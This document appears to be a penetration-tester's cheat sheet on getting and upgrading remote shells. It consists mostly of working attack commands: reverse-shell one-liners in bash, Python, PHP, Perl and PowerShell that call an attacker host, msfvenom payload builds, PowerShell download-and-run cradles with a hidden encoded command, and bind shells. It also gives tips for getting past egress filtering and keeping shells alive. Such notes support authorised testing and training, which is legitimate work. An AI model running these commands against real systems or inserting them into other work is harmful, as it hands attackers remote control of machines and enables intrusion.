# Shells and terminal upgrades

## Reverse shell one-liners
```bash
nc -lvnp 443
rlwrap nc -lvnp 443                     # arrow keys/history
```
```bash
# Bash
bash -i >& /dev/tcp/<KALI>/443 0>&1
exec 5<>/dev/tcp/<KALI>/443; cat <&5 | while read l; do $l 2>&5 >&5; done   # if the first fails

# sh / busybox
/bin/sh -i >& /dev/tcp/<KALI>/443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <KALI> 443 >/tmp/f

# Python3
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("<KALI>",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("<KALI>",443);exec("/bin/sh -i <&3 >&3 2>&3");'

# Perl
perl -e 'use Socket;$i="<KALI>";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
```
```powershell
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('<KALI>',443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"
```
- No callback → egress filtering: retry on 80/443 (same for staging downloads).
- `bash -i >& /dev/tcp` needs bash; `sh` = dash on Debian/Ubuntu → use the mkfifo line.

## Stabilize a Linux TTY
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'   # target
script -qc /bin/bash /dev/null                    # target, no python
export TERM=xterm
# Ctrl+Z, then on Kali:
stty raw -echo; fg                                # Enter twice
stty size                                         # Kali: note rows/cols
stty rows 50 cols 200                             # target
```

## Fully-interactive Windows shell (ConPtyShell: the Windows `stty` trick)
```bash
# kali, auto-size: raw terminal, size is sent to the shell on connect
stty raw -echo; (stty size; cat) | nc -lvnp 443
```
```powershell
# target: from the dumb shell
IEX(IWR http://<KALI>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <KALI> 443
```
```bash
# kali, manual: note size first, listen normally
stty size            # -> e.g. 50 200 (rows cols)
nc -lvnp 443
```
```powershell
IEX(IWR http://<KALI>/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell -RemoteIp <KALI> -RemotePort 443 -Rows 50 -Cols 200
# then on kali: Ctrl+Z, stty raw -echo; fg, Enter
```
- `-Rows`/`-Cols` are named-only; positional `443 200 50` won't bind.
- Kali afterwards: `stty sane` (or `reset`).

## msfvenom payloads
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f elf -o rev.elf
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<KALI> LPORT=443 -f war -o shell.war       # Tomcat
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI> LPORT=443 -f aspx -o shell.aspx
msfvenom -p php/reverse_php LHOST=<KALI> LPORT=443 -f raw -o shell.php
# other formats: -f dll | msi | raw
```
- PHP output: strip the leading comment, add `<?php`.
- Non-staged (`shell_reverse_tcp`) → plain `nc` listener works.

## Windows reverse shells without PowerShell one-liners
Upload `nc.exe` ([file-transfer](file-transfer.md)):
```cmd
C:\Temp\nc.exe <KALI> 443 -e cmd.exe
```
`powercat` from memory (serve `powercat.ps1` on :8000):
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<KALI>:8000/powercat.ps1'); powercat -c <KALI> -p 443 -e cmd
```
- `-e cmd` drops to `cmd.exe`; add `-ep` for PowerShell, `-l -p 4444 -e cmd` for a bind listener.

## PowerShell `-EncodedCommand`
Avoids quoting problems in web shells, `xp_cmdshell`, and command injection. Needs UTF-16LE then Base64:

```bash
printf '%s' "IEX(New-Object Net.WebClient).DownloadString('http://<KALI>:8000/rev.ps1')" \
  | iconv -f UTF-8 -t UTF-16LE | base64 -w0
```
```cmd
powershell -nop -w hidden -enc <BASE64>
```
- Total command line is limited (about 8191 characters through `cmd.exe`): keep the inner command a download cradle, not a whole shell.
- Same encoding feeds the VBA macro chunker ([client-side](client-side-phishing.md#office-vba-document)).
- `rev.ps1` = the PowerShell one-liner above saved as a file.

## Bind shell (outbound traffic blocked)
Target listens, Kali connects. Open the port first (`ss -lntp` / `netstat -ano`); a host firewall can still block it.

```bash
# Linux target
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f
```
```cmd
:: Windows target
C:\Temp\nc.exe -lvnp 4444 -e cmd.exe
```
```bash
nc <IP> 4444                               # Kali
msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f elf -o bind.elf
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
```
- No reverse callback on 443/80/53 either: look for a bind on an allowed inbound port, or tunnel through an existing service ([pivoting](../06-pivoting.md)).

## Fully interactive Linux shell with socat
```bash
# Kali
socat file:`tty`,raw,echo=0 tcp-listen:443
# target (needs socat; upload a static binary if missing)
socat tcp:<KALI>:443 exec:'bash -li',pty,stderr,setsid,sigint,sane
```
- Gives job control and tab completion without `stty` steps.

## Shell hangs or dies
- Web-triggered shell killed with the request: start it detached, `nohup bash -c '<REVERSE-SHELL>' >/dev/null 2>&1 &` or `setsid`, and return a quick response.
- Windows service shell dies on logoff or timeout: migrate to a second shell via a scheduled task or a fresh `nc.exe` callback.
- A command waits for input forever (`sudo`, `mysql`, `passwd`): `Ctrl+C` kills the shell on a non-TTY. [Upgrade to a TTY](#stabilize-a-linux-tty) before interactive tools.
